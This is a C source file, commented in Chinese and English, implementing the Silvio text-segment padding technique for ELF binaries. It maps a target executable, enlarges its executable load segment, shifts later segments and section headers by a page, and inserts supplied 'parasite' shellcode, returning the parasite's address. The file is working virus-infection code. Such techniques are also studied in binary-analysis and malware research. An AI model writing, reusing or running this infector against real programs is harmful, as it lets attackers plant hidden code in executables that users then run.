#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>
#include "common.h"

/**
 * @brief 在文件offset偏移处插入一段数据
 * insert a piece of data at the offset of the file
 * @param elfname elf file name
 * @param offset elf file offset
 * @param data data
 * @param data_size data size
 * @return int result code {-1:error,0:false,1:true}
 */
int insert_data(const char *filename, off_t offset, const void *data, size_t data_size) {
    FILE *file = fopen(filename, "r+b");
    if (file == NULL) {
        perror("fopen");
        return -1;
    }

    // 获取文件末尾位置
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);

    // 将文件指针移动到插入位置
    fseek(file, offset, SEEK_SET);

    // 读取插入位置后的数据
    char *temp_buffer = (char *)malloc(file_size - offset);
    fread(temp_buffer, file_size - offset, 1, file);

    // 将数据写入插入位置
    fseek(file, offset, SEEK_SET);
    fwrite(data, data_size, 1, file);

    // 写入剩余数据
    fwrite(temp_buffer, file_size - offset, 1, file);

    // 释放内存并关闭文件
    free(temp_buffer);
    fclose(file);
    return 0;
}

/**
 * @brief 使用silvio感染算法，填充text段
 * use the Silvio infection algorithm to fill in text segments
 * @param elfname elf file name
 * @param parasite shellcode
 * @param size shellcode size
 * @return uint64_t parasite address {-1:error,0:false,address}
 */
uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
    int fd;
    struct stat st;
    uint8_t *mapped;
    int text_index;
    uint64_t parasite_addr;
    uint64_t parasite_offset;

    fd = open(elfname, O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    if (fstat(fd, &st) < 0) {
        perror("fstat");
        return -1;
    }

    mapped = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mapped == MAP_FAILED) {
        perror("mmap");
        return -1;
    }

    if (MODE == ELFCLASS32) {
        Elf32_Ehdr *ehdr;
        Elf32_Phdr *phdr;
        Elf32_Shdr *shdr;
        ehdr = (Elf32_Ehdr *)mapped;
        phdr = (Elf32_Phdr *)&mapped[ehdr->e_phoff];
        shdr = (Elf32_Shdr *)&mapped[ehdr->e_shoff];
        for (int i = 0; i < ehdr->e_phnum; i++) {
            if (phdr[i].p_type == PT_LOAD) {
                // 1. text段扩容size
                if (phdr[i].p_flags == (PF_R | PF_X)) {
                    text_index = i;
                    parasite_addr = phdr[i].p_vaddr + phdr[i].p_memsz;
                    parasite_offset = phdr[i].p_offset + phdr[i].p_filesz;
                    phdr[i].p_memsz += size;
                    phdr[i].p_filesz += size;
                    VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                    break;
                }
            }
        }

        for (int i = 0; i < ehdr->e_phnum; i++) {
            if (phdr[i].p_type == PT_LOAD) {
                // 2. 其他load段向后偏移
                if (phdr[i].p_offset > phdr[text_index].p_offset) {
                    //phdr[i].p_vaddr += PAGE_SIZE;
                    //phdr[i].p_paddr += PAGE_SIZE;
                    phdr[i].p_offset += PAGE_SIZE;
                }
            }
        }

        for (int i = 0; i < ehdr->e_shnum; i++) {
            // 3. 寄生代码之后的节，偏移PAGE_SIZE
            if (shdr[i].sh_offset > parasite_offset) {
                //shdr[i].sh_addr += PAGE_SIZE;
                shdr[i].sh_offset += PAGE_SIZE;
            }
            // 4. text节，偏移size
            else if (shdr[i].sh_addr + shdr[i].sh_size == parasite_addr) {
                shdr[i].sh_size += size;
            }
        }
        // 5. elf节头偏移PAGE_SIZE
        ehdr->e_shoff += PAGE_SIZE;
    }

    else if (MODE == ELFCLASS64) {
        Elf64_Ehdr *ehdr;
        Elf64_Phdr *phdr;
        Elf64_Shdr *shdr;
        ehdr = (Elf64_Ehdr *)mapped;
        phdr = (Elf64_Phdr *)&mapped[ehdr->e_phoff];
        shdr = (Elf64_Shdr *)&mapped[ehdr->e_shoff];
        for (int i = 0; i < ehdr->e_phnum; i++) {
            if (phdr[i].p_type == PT_LOAD) {
                // 1. text段扩容size
                if (phdr[i].p_flags == (PF_R | PF_X)) {
                    text_index = i;
                    parasite_addr = phdr[i].p_vaddr + phdr[i].p_memsz;
                    parasite_offset = phdr[i].p_offset + phdr[i].p_filesz;
                    phdr[i].p_memsz += size;
                    phdr[i].p_filesz += size;
                    VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                    break;
                }
            }
        }

        for (int i = 0; i < ehdr->e_phnum; i++) {
            if (phdr[i].p_type == PT_LOAD) {
                // 2. 其他load段向后偏移
                if (phdr[i].p_offset > phdr[text_index].p_offset) {
                    phdr[i].p_offset += PAGE_SIZE;
                }
            }
        }

        for (int i = 0; i < ehdr->e_shnum; i++) {
            // 3. 寄生代码之后的节，偏移PAGE_SIZE
            if (shdr[i].sh_offset > parasite_offset) {
                shdr[i].sh_offset += PAGE_SIZE;
            }
            // 4. text节，偏移size
            else if (shdr[i].sh_addr + shdr[i].sh_size == parasite_addr) {
                shdr[i].sh_size += size;
            }
        }
        // 5. elf节头偏移PAGE_SIZE
        ehdr->e_shoff += PAGE_SIZE;
    }

    close(fd);
    munmap(mapped, st.st_size);

    // 6. 插入寄生代码
    char *parasite_expand = malloc(PAGE_SIZE);
    memset(parasite_expand, 0, PAGE_SIZE);
    memcpy(parasite_expand, parasite, PAGE_SIZE - size > 0? size: PAGE_SIZE);
    int ret = insert_data(elfname, parasite_offset, parasite_expand, PAGE_SIZE);
    if (ret == 0) {
        VERBOSE("insert successfully\n");
    }
    free(parasite_expand);

    return parasite_addr;
}